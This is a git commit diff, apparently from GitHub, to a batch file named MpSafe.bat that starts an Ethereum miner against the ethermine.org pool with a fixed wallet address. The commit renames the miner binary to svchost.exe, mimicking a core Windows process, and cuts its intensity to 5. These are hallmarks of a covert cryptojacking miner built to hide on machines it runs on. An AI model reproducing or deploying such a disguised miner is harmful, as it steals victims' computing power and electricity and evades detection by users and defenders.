f1c8cfdcf440a94baa7f90a721fb061225161a4a
Nevskjij <57047360+Nevskjij@users.noreply.github.com>
2021-10-14 15:05:53 +0200

    Update MpSafe.bat

--- MpSafe.bat
+++ MpSafe.bat
@@ -1,2 +1,2 @@
-script.exe -a ethash -s eu1.ethermine.org:5555 --ssl -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.e1qu1egkhhw81n2 --intensity 50
+svchost.exe -a ethash -s eu1.ethermine.org:5555 --ssl -u 0x6ff85749ffac2d3a36efa2bc916305433fa93731.e1qu1egkhhw81n2 --intensity 5
 pause
